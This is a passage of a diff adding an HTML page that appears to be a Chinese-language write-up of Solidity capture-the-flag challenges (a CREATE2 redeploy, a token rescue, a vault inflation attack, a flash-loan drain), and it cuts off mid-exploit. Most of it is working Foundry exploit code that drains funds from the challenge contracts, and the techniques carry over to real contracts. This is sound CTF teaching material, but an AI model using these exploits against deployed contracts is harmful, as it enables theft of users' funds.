+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="cm">/* sending transactions as the governance owner */</span>
+<span class="w">        </span><span class="c1">// deploying the LendingPool contract</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">governanceOwner</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">lendExGovernor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">LendExGovernor</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">usdc</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">lendExGovernor</span><span class="p">.</span><span class="nx">addContract</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendingPool</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">usdc</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendExGovernor</span><span class="p">),</span><span class="w"> </span><span class="nx">usdcAmount</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">// funding the LendingPool contract with USDC</span>
+<span class="w">        </span><span class="nx">lendExGovernor</span><span class="p">.</span><span class="nx">fundLendingPool</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendingPool</span><span class="p">),</span><span class="w"> </span><span class="nx">usdcAmount</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">lendExGovernor</span><span class="p">.</span><span class="nx">getPoolName</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendingPool</span><span class="p">)),</span>
+<span class="w">            </span><span class="s2">&quot;LendingPool V1&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;lendingPool contract has the original name&quot;</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*//////////////////////////////////////////////////////////////////////</span>
+<span class="cm">        //                      Add your hack below!                          //</span>
+<span class="cm">        //                          Hack part #1                              //</span>
+<span class="cm">        // NOTE!!! Foundry has a bug                                          //</span>
+<span class="cm">        // anything selfdestruct() related has to be in the setUp() function  //</span>
+<span class="cm">        //                                                                    //</span>
+<span class="cm">        // terminal command to run the speciffic test:                        //</span>
+<span class="cm">        // forge test --match-contract Challenge3Test -vvvv                   //</span>
+<span class="cm">        //////////////////////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">lendingPool</span><span class="p">.</span><span class="nx">emergencyStop</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">createDeployer</span><span class="p">.</span><span class="nx">cleanUp</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">//====================================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*//////////////////////////////////////////////////////////////</span>
+<span class="cm">        //                    Add your hack below!                    //</span>
+<span class="cm">        //                        Hack part #2                        //</span>
+<span class="cm">        // Please implement necessary changes also to LendingHack.sol //</span>
+<span class="cm">        // terminal command to run the specific test:                 //</span>
+<span class="cm">        // forge test --match-contract Challenge3Test -vvvv           //</span>
+<span class="cm">        //////////////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">createDeployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CreateDeployer</span><span class="p">(</span><span class="nx">create2Deployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">lendingHack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">LendingHack</span><span class="p">(</span><span class="nx">createDeployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">usdc</span><span class="p">)));</span>
+<span class="w">        </span><span class="c1">//=============================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">lendExGovernor</span><span class="p">.</span><span class="nx">getPoolName</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendingPool</span><span class="p">)),</span>
+<span class="w">            </span><span class="s2">&quot;LendingPool hack&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;lendingPool contract address now gives a different name&quot;</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">usdc</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">hacker</span><span class="p">),</span><span class="w"> </span><span class="nx">usdcAmount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Hacker has to steal all the stablecoin tokens&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</div>
+<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/">Deploy Different Contracts at the Same Address | Solidity by Example</a></li>
+</ul>
+<h2 id="4-operation-rescue-posi-token">4. Operation Rescue <code>POSI</code> Token 💼🔓<a class="headerlink" href="#4-operation-rescue-posi-token" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Extract the 1000 <code>POSI</code> tokens from the Vault.</p>
+<p>Transfer the rescued tokens to the address of the organization.</p>
+</blockquote>
+<ul>
+<li>
+<p><code>VaultFactory</code> 使用 <code>CREATE2</code> 部署合约，根据部署字节码和盐值可以确定合约部署的地址</p>
+<blockquote>
+<p>The only thing that we know is that he used to work with us in the past, that his birthday was in November and that he was a big fan of the <code>CREATE2</code> opcode.</p>
+</blockquote>
+</li>
+<li>
+<p>根据提示可以确定 <code>salt</code> 为 11</p>
+</li>
+</ul>
+<h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge4Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">VaultFactory</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">FACTORY</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">PosiCoin</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">POSI</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">unclaimedAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitehat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;whitehat&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">devs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;devs&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">unclaimedAddress</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Unclaimed Address&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// Instantiate the Factory</span>
+<span class="w">        </span><span class="nx">FACTORY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">VaultFactory</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// Instantiate the POSICoin</span>
+<span class="w">        </span><span class="nx">POSI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">PosiCoin</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// OOPS transferred to the wrong address!</span>
+<span class="w">        </span><span class="nx">POSI</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">unclaimedAddress</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testWhitehatRescue</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge4Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">VaultWalletTemplate</span><span class="w"> </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">VaultWalletTemplate</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">FACTORY</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">type</span><span class="p">(</span><span class="nx">VaultWalletTemplate</span><span class="p">).</span><span class="nx">creationCode</span><span class="p">,</span><span class="w"> </span><span class="mf">11</span><span class="p">)));</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">initialize</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">withdrawERC20</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">POSI</span><span class="p">),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="nx">devs</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">POSI</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">devs</span><span class="p">),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;devs&#39; POSI balance should be 1000 POSI&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="5-balloon-vault">5. Balloon Vault 🎈🎈<a class="headerlink" href="#5-balloon-vault" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Drain <em>Bob's wallet</em> and <em>Alice's wallet</em></p>
+<p>End up with more than <code>1000 ETH</code> in your wallet</p>
+</blockquote>
+<ul>
+<li>
+<p><code>BallonVault</code> 有转移 Bob 和 Alice 持有 WETH 的许可</p>
+<div class="highlight"><pre><span></span><code><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">bob</span><span class="p">);</span>
+<span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">alice</span><span class="p">);</span>
+<span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+</code></pre></div>
+</li>
+<li>
+<p>WETH 没有函数 <code>permit()</code>，因此调用 <code>depositWithPermit()</code> 不会对签名进行校验</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">depositWithPermit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">deadline</span><span class="p">,</span><span class="w"> </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">s</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">external</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="nx">IERC20Permit</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">asset</span><span class="p">())).</span><span class="nx">permit</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">deadline</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">_deposit</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">previewDeposit</span><span class="p">(</span><span class="nx">amount</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>attacker</code> 没有转移 Bob 或 Alice 持有 Shares 的许可，通过通货膨胀攻击，使 Bob 或 Alice 的 deposit 无法获得 Shares，从而在 redeem 时获得更多的 WETH</p>
+</li>
+</ul>
+<h3 id="exploit_4">Exploit<a class="headerlink" href="#exploit_4" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge5Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">BallonVault</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">WETH</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">weth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WETH</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">attacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;attacker&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">bob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;bob&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">alice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;alice&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">BallonVault</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">));</span>
+
+<span class="w">        </span><span class="c1">// Attacker starts with 10 ether</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">attacker</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// Set up Bob and Alice with 500 WETH each</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">bob</span><span class="p">,</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">bob</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">alice</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="mf">500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_inflation_attack</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">victim</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">attacker</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">depositWithPermit</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">victim</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">victim</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">victim</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
+<span class="w">            </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">            </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">bytes32</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span>
+<span class="w">            </span><span class="nx">bytes32</span><span class="p">(</span><span class="mf">0</span><span class="p">)</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">redeem</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">attacker</span><span class="p">,</span><span class="w"> </span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge5Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">alice</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">_inflation_attack</span><span class="p">(</span><span class="nx">alice</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">_inflation_attack</span><span class="p">(</span><span class="nx">bob</span><span class="p">);</span><span class="w"> </span><span class="c1">// the attacker now has enough weth to steal from Bob in a single step</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertGt</span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">attacker</span><span class="p">)),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Attacker should have more than 1000 ether&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="6-safe-yield">6. Safe Yield? 🏦📈<a class="headerlink" href="#6-safe-yield" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Drain at least <code>100 ETH</code> from the yield pool.</p>
+</blockquote>
+<p><code>flashLoan()</code> 在完成 <code>onFlashLoan()</code> 的调用后只检查合约中对应资产的余额，可在回调函数中通过 <code>addLiquidity()</code>、<code>ethToToken()</code> 或 <code>tokenToEth()</code> 进行转换</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">ETH</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">expected</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Flash loan not repayed&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">getReserve</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">expected</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Flash loan not repayed&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="exploit_5">Exploit<a class="headerlink" href="#exploit_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IERC3156FlashBorrower</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">YieldPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">SecureumToken</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">payable</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">YieldPool</span><span class="w"> </span><span class="nx">_pool</span><span class="p">,</span><span class="w"> </span><span class="nx">SecureumToken</span><span class="w"> </span><span class="nx">_token</span><span class="p">)</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_pool</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span>
+<span class="w">                    </span><span class="nx">IERC3156FlashBorrower</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span>
+<span class="w">                    </span><span class="nx">pool</span><span class="p">.</span><span class="nx">ETH</span><span class="p">(),</span>
+<span class="w">                    </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100</span><span class="p">,</span>
+<span class="w">                    </span><span class="s2">&quot;&quot;</span>
+<span class="w">                </span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span>
